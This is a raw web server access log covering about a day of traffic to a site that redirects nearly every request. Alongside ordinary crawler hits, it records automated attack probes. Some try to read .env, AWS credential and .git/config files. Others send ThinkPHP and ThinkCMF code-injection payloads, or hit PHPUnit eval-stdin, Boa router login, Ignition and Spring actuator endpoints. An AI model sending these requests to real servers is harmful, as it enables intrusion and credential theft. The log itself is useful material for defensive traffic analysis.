31.58.31.2 - - [18/Jan/2023:07:04:03 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
205.185.118.237 - - [18/Jan/2023:07:04:08 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
180.149.125.159 - - [18/Jan/2023:07:54:53 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
149.129.50.37 - - [18/Jan/2023:08:02:51 -0600] "GET http://www.1ucn.com/proxychecker/index.php HTTP/1.1" 301 254 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98"
149.129.50.37 - - [18/Jan/2023:08:02:52 -0600] "CONNECT hilltopmanor.xyzproxychecker:443 HTTP/1.1" 301 232 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98"
143.110.222.166 - - [18/Jan/2023:08:10:41 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [18/Jan/2023:08:19:54 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
185.254.196.223 - - [18/Jan/2023:08:24:23 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [18/Jan/2023:08:24:25 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [18/Jan/2023:10:05:38 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
174.135.136.238 - - [18/Jan/2023:10:40:18 -0600] "GET /phpmyadmin/ HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
34.73.164.122 - - [18/Jan/2023:11:04:48 -0600] "\x16\x03\x01" 400 226 "-" "-"
34.73.164.122 - - [18/Jan/2023:11:04:52 -0600] "OPTIONS / HTTP/1.0" 301 232 "-" "-"
193.32.162.159 - - [18/Jan/2023:11:08:22 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [18/Jan/2023:11:08:47 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [18/Jan/2023:11:21:59 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [18/Jan/2023:11:21:59 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [18/Jan/2023:12:02:37 -0600] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [18/Jan/2023:12:05:59 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [18/Jan/2023:12:09:44 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [18/Jan/2023:12:19:02 -0600] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [18/Jan/2023:12:25:07 -0600] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [18/Jan/2023:12:38:00 -0600] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.56.113.64 - - [18/Jan/2023:12:41:13 -0600] "GET / HTTP/1.0" 301 241 "http://skillscybersecurityok.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
152.89.196.211 - - [18/Jan/2023:12:46:16 -0600] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [18/Jan/2023:13:08:29 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
109.237.97.180 - - [18/Jan/2023:13:30:01 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:01 -0600] "\x16\x03\x01\x01H\x01" 400 226 "-" "-"
109.237.97.180 - - [18/Jan/2023:13:30:02 -0600] "GET /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:02 -0600] "GET /.aws/credentials HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:02 -0600] "POST /.aws/credentials HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:02 -0600] "POST /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:03 -0600] "GET /aws/credentials HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:03 -0600] "POST /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:03 -0600] "POST /aws/credentials HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:04 -0600] "GET /credentials HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:04 -0600] "GET /test.php HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:04 -0600] "POST /credentials HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:04 -0600] "POST /test.php HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:05 -0600] "GET /demo/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:05 -0600] "GET /laravel/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:05 -0600] "POST /laravel/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:06 -0600] "GET /web/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:06 -0600] "POST /demo/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:06 -0600] "POST /web/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:07 -0600] "GET /phpinfo HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [18/Jan/2023:13:30:07 -0600] "POST /phpinfo HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.100.107.200 - - [18/Jan/2023:13:30:51 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
193.32.162.159 - - [18/Jan/2023:13:41:13 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
152.89.196.211 - - [18/Jan/2023:13:45:29 -0600] "GET /console/ HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [18/Jan/2023:14:07:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
170.64.150.13 - - [18/Jan/2023:14:10:34 -0600] "\x16\x03\x01" 400 226 "-" "-"
170.64.150.13 - - [18/Jan/2023:14:10:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.150.13 - - [18/Jan/2023:14:10:35 -0600] "\x16\x03\x01" 400 226 "-" "-"
193.32.162.159 - - [18/Jan/2023:14:15:02 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
162.241.123.67 - - [18/Jan/2023:14:21:58 -0600] "-" 408 - "-" "-"
152.89.196.211 - - [18/Jan/2023:14:24:07 -0600] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [18/Jan/2023:14:25:40 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [18/Jan/2023:14:25:40 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.94.138.118 - - [18/Jan/2023:14:34:13 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
167.94.138.118 - - [18/Jan/2023:14:34:13 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.118 - - [18/Jan/2023:14:34:13 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
159.203.97.76 - - [18/Jan/2023:14:37:21 -0600] "GET /.git/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [18/Jan/2023:14:44:02 -0600] "GET /_ignition/execute-solution HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
198.98.52.86 - - [18/Jan/2023:14:48:14 -0600] "GET /api/ HTTP/1.1" 301 236 "-" "Mozilla/5.0 zgrab/0.x"
192.3.76.212 - - [18/Jan/2023:14:54:32 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
143.110.222.166 - - [18/Jan/2023:15:04:36 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [18/Jan/2023:15:06:15 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [18/Jan/2023:15:47:15 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.32.162.159 - - [18/Jan/2023:15:56:51 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [18/Jan/2023:16:08:33 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.118.39.82 - - [18/Jan/2023:16:09:20 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
152.89.196.211 - - [18/Jan/2023:16:32:53 -0600] "GET /actuator/gateway/routes HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
81.174.133.195 - - [18/Jan/2023:16:33:54 -0600] "GET /phpmyadmin/ HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
193.32.162.159 - - [18/Jan/2023:16:39:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
103.249.27.60 - - [18/Jan/2023:16:45:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.110.222.166 - - [18/Jan/2023:17:03:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
194.180.49.233 - - [18/Jan/2023:17:04:24 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
194.180.49.233 - - [18/Jan/2023:17:04:33 -0600] "GET ../../proc/ HTTP" 400 226 "-" "-"
179.43.177.242 - - [18/Jan/2023:17:22:45 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
185.254.196.223 - - [18/Jan/2023:17:25:06 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [18/Jan/2023:17:25:06 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [18/Jan/2023:18:03:36 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
103.114.107.34 - - [18/Jan/2023:18:07:43 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.114.107.34 - - [18/Jan/2023:18:07:44 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
188.166.161.48 - - [18/Jan/2023:18:38:49 -0600] "\x16\x03\x01" 400 226 "-" "-"
188.166.161.48 - - [18/Jan/2023:18:38:50 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
188.166.161.48 - - [18/Jan/2023:18:38:50 -0600] "\x16\x03\x01" 400 226 "-" "-"
198.199.98.85 - - [18/Jan/2023:18:57:44 -0600] "GET /druid/index.html HTTP/1.1" 301 248 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [18/Jan/2023:19:10:28 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
134.209.16.190 - - [18/Jan/2023:19:11:58 -0600] "GET /system_api.php HTTP/1.1" 301 246 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
134.209.16.190 - - [18/Jan/2023:19:11:58 -0600] "HEAD / HTTP/1.0" 301 - "-" "-"
134.209.16.190 - - [18/Jan/2023:19:11:59 -0600] "GET /c/version.js HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
134.209.16.190 - - [18/Jan/2023:19:12:00 -0600] "GET /streaming/clients_live.php HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
134.209.16.190 - - [18/Jan/2023:19:12:01 -0600] "GET /stalker_portal/c/version.js HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
134.209.16.190 - - [18/Jan/2023:19:12:02 -0600] "GET /flu/403.html HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
134.209.16.190 - - [18/Jan/2023:19:12:02 -0600] "GET /stream/live.php HTTP/1.1" 301 247 "-" "Roku/DVP-9.10 (289.10E04111A)"
134.209.16.190 - - [18/Jan/2023:19:12:03 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
205.185.118.237 - - [18/Jan/2023:19:27:22 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
154.89.5.81 - - [18/Jan/2023:19:42:11 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
205.185.118.237 - - [18/Jan/2023:20:00:50 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [18/Jan/2023:20:09:48 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [18/Jan/2023:20:25:06 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [18/Jan/2023:20:25:07 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [18/Jan/2023:21:11:12 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
18.170.28.95 - - [18/Jan/2023:21:11:38 -0600] "GET / HTTP/1.0" 301 233 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
18.170.28.95 - - [18/Jan/2023:21:15:28 -0600] "GET / HTTP/1.0" 301 233 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
18.170.28.95 - - [18/Jan/2023:21:19:18 -0600] "GET / HTTP/1.0" 301 233 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
20.203.221.49 - - [18/Jan/2023:21:32:22 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
143.110.222.166 - - [18/Jan/2023:22:07:11 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [18/Jan/2023:23:13:00 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [18/Jan/2023:23:25:35 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [18/Jan/2023:23:25:35 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.213.67 - - [18/Jan/2023:23:40:05 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 zgrab/0.x"
179.43.177.242 - - [19/Jan/2023:00:03:10 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [19/Jan/2023:00:10:15 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
205.185.118.237 - - [19/Jan/2023:00:26:54 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
92.118.39.82 - - [19/Jan/2023:00:57:49 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
42.83.147.34 - - [19/Jan/2023:01:00:06 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36"
179.43.177.242 - - [19/Jan/2023:01:07:59 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
143.110.222.166 - - [19/Jan/2023:01:13:27 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
139.99.120.203 - - [19/Jan/2023:02:02:04 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:05 -0600] "GET /conf/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:07 -0600] "GET /wp-content/.env HTTP/1.1" 301 247 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:08 -0600] "GET /wp-admin/.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:09 -0600] "GET /library/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:11 -0600] "GET /new/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:12 -0600] "GET /vendor/.env HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
